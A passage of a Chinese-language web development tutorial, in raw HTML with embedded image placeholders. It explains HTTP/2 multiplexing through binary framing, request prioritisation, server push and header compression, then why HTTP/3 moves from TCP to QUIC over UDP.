PNgSx9ekPFdIabJikmleiNh0mF+uONNadMx2sX0JY74+9q/N7DqLk9iEru39IDLvhP1HnT/SF//GktvDEGFUWT/R7v+ni7xpx2Pn8F7GFB9y/ZEe3AAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 10 11" title="" data-src="/static/2021-07-15-14-10-11-087266f99c6858c306ea1952ba3e80e1-fee1c.png" data-srcset="/static/2021-07-15-14-10-11-087266f99c6858c306ea1952ba3e80e1-a67b7.png 200w,\n/static/2021-07-15-14-10-11-087266f99c6858c306ea1952ba3e80e1-0b187.png 400w,\n/static/2021-07-15-14-10-11-087266f99c6858c306ea1952ba3e80e1-fee1c.png 800w,\n/static/2021-07-15-14-10-11-087266f99c6858c306ea1952ba3e80e1-09eb7.png 1142w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>从图中可以看出，HTTP/2 添加了一个二进制分帧层，那我们就结合图来分析下 HTTP/2 的请求和接收过程。</p>\n<ul>\n<li>首先，浏览器准备好请求数据，包括了请求行、请求头等信息，如果是 POST 方法，那么还要有请求体。</li>\n<li>这些数据经过二进制分帧层处理之后，会被转换为一个个带有请求 ID 编号的帧，通过协议栈将这些帧发送给服务器。</li>\n<li>服务器接收到所有帧之后，会将所有相同 ID 的帧合并为一条完整的请求信息。</li>\n<li>然后服务器处理该条请求，并将处理的响应行、响应头和响应体分别发送至二进制分帧层。</li>\n<li>同样，二进制分帧层会将这些响应数据转换为一个个带有请求 ID 编号的帧，经过协议栈发送给浏览器。</li>\n<li>浏览器接收到响应帧之后，会根据 ID 编号将帧的数据提交给对应的请求</li>\n</ul>\n<p>从上面的流程可以看出，通过引入二进制分帧层，就实现了 HTTP 的多路复用技术。</p>\n<p>上一篇文章我们介绍过，HTTP 是浏览器和服务器通信的语言，在这里虽然 HTTP/2 引入了二进制分帧层，不过 HTTP/2 的语义和 HTTP/1.1 依然是一样的，也就是说它们通信的语言并没有改变，比如开发者依然可以通过 Accept 请求头告诉服务器希望接收到什么类型的文件，依然可以使用 Cookie 来保持登录状态，依然可以使用 Cache 来缓存本地文件，这些都没有变，发生改变的只是传输方式。这一点对开发者来说尤为重要，这意味着我们不需要为 HTTP/2 去重建生态，并且 HTTP/2 推广起来会也相对更轻松了</p>\n<h2 id="http2"><a href="#http2" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP/2</h2>\n<p>其他特性通过上面的分析，我们知道了多路复用是 HTTP/2 的最核心功能，它能实现资源的并行传输。多路复用技术是建立在二进制分帧层的基础之上。其实基于二进制分帧层，HTTP/2 还附带实现了很多其他功能，下面我们就来简要了解下。</p>\n<h3 id="设置请求的优先级"><a href="#%E8%AE%BE%E7%BD%AE%E8%AF%B7%E6%B1%82%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>设置请求的优先级</h3>\n<p>我们知道浏览器中有些数据是非常重要的，但是在发送请求时，重要的请求可能会晚于那些不怎么重要的请求，如果服务器按照请求的顺序来回复数据，那么这个重要的数据就有可能推迟很久才能送达浏览器，这对于用户体验来说是非常不友好的。</p>\n<p>为了解决这个问题，HTTP/2 提供了请求优先级，可以在发送请求时，标上该请求的优先级，这样服务器接收到请求之后，会优先处理优先级高的请求。</p>\n<h3 id="服务器推送"><a href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A8%E9%80%81" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>服务器推送</h3>\n<p>除了设置请求的优先级外，HTTP/2 还可以直接将数据提前推送到浏览器。你可以想象这样一个场景，当用户请求一个 HTML 页面之后，服务器知道该 HTML 页面会引用几个重要的 JavaScript 文件和 CSS 文件，那么在接收到 HTML 请求之后，附带将要使用的 CSS 文件和 JavaScript 文件一并发送给浏览器，这样当浏览器解析完 HTML 文件之后，就能直接拿到需要的 CSS 文件和 JavaScript 文件，这对首次打开页面的速度起到了至关重要的作用。</p>\n<h3 id="头部压缩"><a href="#%E5%A4%B4%E9%83%A8%E5%8E%8B%E7%BC%A9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>头部压缩</h3>\n<p>无论是 HTTP/1.1 还是 HTTP/2，它们都有请求头和响应头，这是浏览器和服务器的通信语言。HTTP/2 对请求头和响应头进行了压缩，你可能觉得一个 HTTP 的头文件没有多大，压不压缩可能关系不大，但你这样想一下，在浏览器发送请求的时候，基本上都是发送 HTTP 请求头，很少有请求体的发送，通常情况下页面也有 100 个左右的资源，如果将这 100 个请求头的数据压缩为原来的 20%，那么传输效率肯定能得到大幅提升。</p>\n<h2 id="总结-1"><a href="#%E6%80%BB%E7%BB%93-1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>我们首先分析了影响 HTTP/1.1 效率的三个主要因素：TCP 的慢启动、多条 TCP 连接竞争带宽和队头阻塞。</p>\n<p>接下来我们分析了 HTTP/2 是如何采用多路复用机制来解决这些问题的。多路复用是通过在协议栈中添加二进制分帧层来实现的，有了二进制分帧层还能够实现请求的优先级、服务器推送、头部压缩等特性，从而大大提升了文件传输效率。</p>\n<p>HTTP/2 协议规范于 2015 年 5 月正式发布，在那之后，该协议已在互联网和万维网上得到了广泛的实现和部署。从目前的情况来看，国内外一些排名靠前的站点基本都实现了 HTTP/2 的部署。使用 HTTP/2 能带来 20%～ 60% 的效率提升，至于 20% 还是 60% 要看优化的程度。总之，我们也应该与时俱进，放弃 HTTP/1.1 和其性能优化方法，去“拥抱”HTTP/2</p>\n<h1 id="http3：甩掉-tcp、tcl-包袱构建高效网络"><a href="#http3%EF%BC%9A%E7%94%A9%E6%8E%89-tcp%E3%80%81tcl-%E5%8C%85%E8%A2%B1%E6%9E%84%E5%BB%BA%E9%AB%98%E6%95%88%E7%BD%91%E7%BB%9C" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP3：甩掉 TCP、TCL 包袱构建高效网络</h1>\n<p>前面两篇文章我们分析了 HTTP/1 和 HTTP/2，在 HTTP/2 出现之前，开发者需要采取很多变通的方式来解决 HTTP/1 所存在的问题，不过 HTTP/2 在 2018 年就开始得到了大规模的应用，HTTP/1 中存在的一大堆缺陷都得到了解决。</p>\n<p>HTTP/2 的一个核心特性是使用了多路复用技术，因此它可以通过一个 TCP 连接来发送多个 URL 请求。多路复用技术能充分利用带宽，最大限度规避了 TCP 的慢启动所带来的问题，同时还实现了头部压缩、服务器推送等功能，使得页面资源的传输速度得到了大幅提升。在 HTTP/1.1 时代，为了提升并行下载效率，浏览器为每个域名维护了 6 个 TCP 连接；而采用 HTTP/2 之后，浏览器只需要为每个域名维护 1 个 TCP 持久连接，同时还解决了 HTTP/1.1 队头阻塞的问题。</p>\n<p>从目前的情况来看，HTTP/2 似乎可以完美取代 HTTP/1 了，不过 HTTP/2 依然存在一些缺陷，于是就有了 HTTP/3。和通常一样，介绍 HTTP/3 之前，我们先来看看 HTTP/2 到底有什么缺陷。</p>\n<h2 id="tcp-的队头阻塞"><a href="#tcp-%E7%9A%84%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TCP 的队头阻塞</h2>\n<p>虽然 HTTP/2 解决了应用层面的队头阻塞问题，不过和 HTTP/1.1 一样，HTTP/2 依然是基于 TCP 协议的，而 TCP 最初就是为了单连接而设计的。你可以把 TCP 连接看成是两台计算机之前的一个虚拟管道，计算机的一端将要传输的数据按照顺序放入管道，最终数据会以相同的顺序出现在管道的另外一头。</p>\n<p>接下来我们就来分析下 HTTP/1.1 协议栈中 TCP 是如何传输数据的。为直观理解，你可以参考下图：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-15-36-8b94d7e112f1191fbef4912f9bfe7289-067fb.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 33.28509406657019%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsSAAALEgHS3X78AAABPUlEQVQY022QzUrDQBSF84A+hBs3dqdufAAfQUFcCC7cFdEiVNGdaHVR/wpKapq0oa1pfiZJk0xm7swdb+lCpB4us7j3HJjvWIakwWBlNEclUQMiIHCDtVBa00lVqASiojFaGOQLJ2rKWUJIXiTjyYCFQx1/QPAGQQ8zz/WdvdbjeadryrGKbRm800nE9mTqBd9DWZeccytPoo4Xr526Bw8+PO3Pmo3ianfk97dP2htHl5uHzeP7PgxuotZOctbwn1vrF9Ottp9laRiGlgQFFZtHLmcjlbrAHJ06PHHvep/Xr/Zt96Vrf2E+hMRRzFGpR7Y6HSnJpQRrwbyE0QI1MStDPLQxYIz6HWKmOqiCpRNxwWz+irZZnieMpVk+L8o0nwezMIrjoijMiv4JC1FTGZK+BUBvWZZVVUkhVsM/Xw6FnEvf30IAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 15 36" title="" data-src="/static/2021-07-15-14-15-36-8b94d7e112f1191fbef4912f9bfe7289-fee1c.png" data-srcset="/static/2021-07-15-14-15-36-8b94d7e112f1191fbef4912f9bfe7289-a67b7.png 200w,\n/static/2021-07-15-14-15-36-8b94d7e112f1191fbef4912f9bfe7289-0b187.png 400w,\n/static/2021-07-15-14-15-36-8b94d7e112f1191fbef4912f9bfe7289-fee1c.png 800w,\n/static/2021-07-15-14-15-36-8b94d7e112f1191fbef4912f9bfe7289-b1a91.png 1200w,\n/static/2021-07-15-14-15-36-8b94d7e112f1191fbef4912f9bfe7289-067fb.png 1382w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>通过上图你会发现，从一端发送给另外一端的数据会被拆分为一个个按照顺序排列的数据包，这些数据包通过网络传输到了接收端，接收端再按照顺序将这些数据包组合成原始数据，这样就完成了数据传输。</p>\n<p>不过，如果在数据传输的过程中，有一个数据因为网络故障或者其他原因而丢包了，那么整个 TCP 的连接就会处于暂停状态，需要等待丢失的数据包被重新传输过来。你可以把 TCP 连接看成是一个按照顺序传输数据的管道，管道中的任意一个数据丢失了，那之后的数据都需要等待该数据的重新传输。为了直观理解，你可以参考下图：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-15-51-3e6d025d2c36c8cac3fe7dd16e8dc77b-4f503.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 34.95145631067961%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsSAAALEgHS3X78AAABd0lEQVQoz32RQUsbQRTH99P4DXrxG/gJPPdQDx68KtJTK73VYA+91JuEHrTW9CCNQjCo0IoUCVHboIldE4nGbDa7Y7K7szs/ZyaBFqF98JuB/7z3mPd/DihsqFQfQ4vKlJWVeUoTfURc9TP8QaTFiEwaBrpEQmbqBqNaleFIKXkQAi/os3lyxe75NcPWHoNGwTK8PaFU+cn8xldyO/vctK9R/iVp0CLp/ODh5htfTttsV11kPMRJkgTf83A7Hi+Ll6wcuIQXG/iVd/QrK3jN7yx+OGLhc5m5TyXe7x0T+7q4e4E4+4h3vs5S8Rdvy3Vi01Cp8chxH0RD85ssbKPEndZCkto2jfwLzgqvabg1Ou261j16pTfUXk1QX56kmXsGrUNtUYrDuGGmvUhlbDEepbGw7opqgbvVKcTWLEihE2OrR9VNbtemaeafc78+Q9Jzre4oa/74l/8IsyOZKk3G/zP5M7K5n2LCLC0MBffdLkEQPMnlL0baIwzNCA6AmECJAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 15 51" title="" data-src="/static/2021-07-15-14-15-51-3e6d025d2c36c8cac3fe7dd16e8dc77b-fee1c.png" data-srcset="/static/2021-07-15-14-15-51-3e6d025d2c36c8cac3fe7dd16e8dc77b-a67b7.png 200w,\n/static/2021-07-15-14-15-51-3e6d025d2c36c8cac3fe7dd16e8dc77b-0b187.png 400w,\n/static/2021-07-15-14-15-51-3e6d025d2c36c8cac3fe7dd16e8dc77b-fee1c.png 800w,\n/static/2021-07-15-14-15-51-3e6d025d2c36c8cac3fe7dd16e8dc77b-b1a91.png 1200w,\n/static/2021-07-15-14-15-51-3e6d025d2c36c8cac3fe7dd16e8dc77b-4f503.png 1442w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>我们就把在 TCP 传输过程中，由于单个数据包的丢失而造成的阻塞称为 TCP 上的队头阻塞。</p>\n<p>那队头阻塞是怎么影响 HTTP/2 传输的呢？首先我们来看正常情况下 HTTP/2 是怎么传输多路请求的，为了直观理解，你可以参考下图：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-16-03-73bd55e06837e14c2226d8dd088f0f6a-baf19.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 34.036568213783404%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsSAAALEgHS3X78AAABY0lEQVQoz21Ry07CQBTtP/oFfpULNy5MjEKMcaEkRhcQkfBQwqsVAtIK1AItYOn0MXSOd1orLGxy5t7bc+Yk544SA5DgdESEnUjBD/rskzpxADlLXmAvUgKziJ07pDYixRIIXWp9UjLqN+Ts4nU6wdCc0z+aAy/lOVW+ojurxIjPKwgWDSirSQOLWQfPIxtnlTGWZhmGfolW8xpsVsV9s4ujizyOr24w0nswpwX0+znovTuUeirOazqYH2A8KILZKpSO/Y7WpIP6h00kGX5VMDHy6LZvwcwGHlttnJaqOHl5Ql1tYm4+YDDIQ1cLqGgacm8GPM9DzdCwiRiUT7cLO5xRHBmFKrMB/zuJKxitICD4DkHGJY5RxEDya6qWzJosU1uXYbIhlGyZOyHA5YIJMR0Zwogj4hx+4CMMo+QB9vw/jxKLmEzidBKpoxCpII5jbLfbBJZlwXGcX5n402Z6kfgI/AAw2BHfP/u1BwAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 16 03" title="" data-src="/static/2021-07-15-14-16-03-73bd55e06837e14c2226d8dd088f0f6a-fee1c.png" data-srcset="/static/2021-07-15-14-16-03-73bd55e06837e14c2226d8dd088f0f6a-a67b7.png 200w,\n/static/2021-07-15-14-16-03-73bd55e06837e14c2226d8dd088f0f6a-0b187.png 400w,\n/static/2021-07-15-14-16-03-73bd55e06837e14c2226d8dd088f0f6a-fee1c.png 800w,\n/static/2021-07-15-14-16-03-73bd55e06837e14c2226d8dd088f0f6a-b1a91.png 1200w,\n/static/2021-07-15-14-16-03-73bd55e06837e14c2226d8dd088f0f6a-baf19.png 1422w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>通过该图，我们知道在 HTTP/2 中，多个请求是跑在一个 TCP 管道中的，如果其中任意一路数据流中出现了丢包的情况，那么就会阻塞该 TCP 连接中的所有请求。这不同于 HTTP/1.1，使用 HTTP/1.1 时，浏览器为每个域名开启了 6 个 TCP 连接，如果其中的 1 个 TCP 连接发生了队头阻塞，那么其他的 5 个连接依然可以继续传输数据。</p>\n<p>所以随着丢包率的增加，HTTP/2 的传输效率也会越来越差。有测试数据表明，当系统达到了 2% 的丢包率时，HTTP/1.1 的传输效率反而比 HTTP/2 表现得更好。</p>\n<h2 id="tcp-建立连接的延时"><a href="#tcp-%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BB%B6%E6%97%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TCP 建立连接的延时</h2>\n<p>除了 TCP 队头阻塞之外，TCP 的握手过程也是影响传输效率的一个重要因素。</p>\n<p>为了搞清楚 TCP 协议建立连接的延迟问题，我们还是先来回顾下网络延迟的概念，这会有助于你对后面内容的理解。网络延迟又称为 RTT（Round Trip Time）。我们把从浏览器发送一个数据包到服务器，再从服务器返回数据包到浏览器的整个往返时间称为 RTT（如下图）。RTT 是反映网络性能的一个重要指标。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-16-38-2b18c8fd21439193c593bae95fba9e64-71f71.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 76.26262626262627%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsSAAALEgHS3X78AAABLElEQVQoz6VT2Y6DMAzM/38azzwgxLa0iPtKSAhn0k5Bi7IsdCuthSI78djjSSCPfxgxg3meh2Ewd/Riv2HIxP4P8DiObduumPc9pZTTNO3BXddtPbEWReG6bhAE8JVSGxEhxAJGgE+pF7jvw/s9z/Msy3CMQgBHUdQ0za4zjsCcbMNhGRjltEYHUKCUAllVFZyyLNM0RQiHMdb3PULkEM3Z7H/Nt4su8kGIVsrDIcEWcoBCHMeO41iWheZEy1YVmW7Yo5Mjb7aZYcjmnNd1nSQJWoEFfIxzQlvw8ObXlKI8ACtnecQFdQ3BFjDG8K9XZOvvEFLbtu15HlawWDU3wIYhNmmjBHYgDwBwzMs/uGfE8kSwvx/J57a+FvI+Y1rsox9jZxAsDEPIfoZ/AoucbvRsZSdcAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 16 38" title="" data-src="/static/2021-07-15-14-16-38-2b18c8fd21439193c593bae95fba9e64-fee1c.png" data-srcset="/static/2021-07-15-14-16-38-2b18c8fd21439193c593bae95fba9e64-a67b7.png 200w,\n/static/2021-07-15-14-16-38-2b18c8fd21439193c593bae95fba9e64-0b187.png 400w,\n/static/2021-07-15-14-16-38-2b18c8fd21439193c593bae95fba9e64-fee1c.png 800w,\n/static/2021-07-15-14-16-38-2b18c8fd21439193c593bae95fba9e64-71f71.png 1188w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>那建立 TCP 连接时，需要花费多少个 RTT 呢？下面我们来计算下。</p>\n<p>我们知道 HTTP/1 和 HTTP/2 都是使用 TCP 协议来传输的，而如果使用 HTTPS 的话，还需要使用 TLS 协议进行安全传输，而使用 TLS 也需要一个握手过程，这样就需要有两个握手延迟过程。</p>\n<ul>\n<li>在建立 TCP 连接的时候，需要和服务器进行三次握手来确认连接成功，也就是说需要在消耗完 1.5 个 RTT 之后才能进行数据传输。</li>\n<li>进行 TLS 连接，TLS 有两个版本——TLS1.2 和 TLS1.3，每个版本建立连接所花的时间不同，大致是需要 1 ～ 2 个 RTT，关于 HTTPS 我们到后面到安全模块再做详细介绍</li>\n</ul>\n<p>总之，在传输数据之前，我们需要花掉 3 ～ 4 个 RTT。如果浏览器和服务器的物理距离较近，那么 1 个 RTT 的时间可能在 10 毫秒以内，也就是说总共要消耗掉 30 ～ 40 毫秒。这个时间也许用户还可以接受，但如果服务器相隔较远，那么 1 个 RTT 就可能需要 100 毫秒以上了，这种情况下整个握手过程需要 300 ～ 400 毫秒，这时用户就能明显地感受到“慢”了。</p>\n<h2 id="tcp-协议僵化"><a href="#tcp-%E5%8D%8F%E8%AE%AE%E5%83%B5%E5%8C%96" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TCP 协议僵化</h2>\n<p>现在我们知道了 TCP 协议存在队头阻塞和建立连接延迟等缺点，那我们是不是可以通过改进 TCP 协议来解决这些问题呢？</p>\n<p>答案是：非常困难。之所以这样，主要有两个原因。</p>\n<p>第一个是中间设备的僵化。要搞清楚什么是中间设备僵化，我们先要弄明白什么是中间设备。我们知道互联网是由多个网络互联的网状结构，为了能够保障互联网的正常工作，我们需要在互联网的各处搭建各种设备，这些设备就被称为中间设备。</p>\n<p>这些中间设备有很多种类型，并且每种设备都有自己的目的，这些设备包括了路由器、防火墙、NAT、交换机等。它们通常依赖一些很少升级的软件，这些软件使用了大量的 TCP 特性，这些功能被设置之后就很少更新了。</p>\n<p>所以，如果我们在客户端升级了 TCP 协议，但是当新协议的数据包经过这些中间设备时，它们可能不理解包的内容，于是这些数据就会被丢弃掉。这就是中间设备僵化，它是阻碍 TCP 更新的一大障碍。</p>\n<p>除了中间设备僵化外，操作系统也是导致 TCP 协议僵化的另外一个原因。因为 TCP 协议都是通过操作系统内核来实现的，应用程序只能使用不能修改。通常操作系统的更新都滞后于软件的更新，因此要想自由地更新内核中的 TCP 协议也是非常困难的</p>\n<h2 id="quic-协议"><a href="#quic-%E5%8D%8F%E8%AE%AE" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>QUIC 协议</h2>\n<p>HTTP/2 存在一些比较严重的与 TCP 协议相关的缺陷，但由于 TCP 协议僵化，我们几乎不可能通过修改 TCP 协议自身来解决这些问题，那么解决问题的思路是绕过 TCP 协议，发明一个 TCP 和 UDP 之外的新的传输协议。但是这也面临着和修改 TCP 一样的挑战，因为中间设备的僵化，这些设备只认 TCP 和 UDP，如果采用了新的协议，新协议在这些设备同样不被很好地支持。</p>\n<p>因此，HTTP/3 选择了一个折衷的方法——UDP 协议，基于 UDP 实现了类似于 TCP 的多路数据流、传输可靠性等功能，我们把这套功能称为 QUIC 协议。关于 HTTP/2 和 HTTP/3 协议栈的比较，你可以参考下图：</p>\n<p><html><head></head><body><a 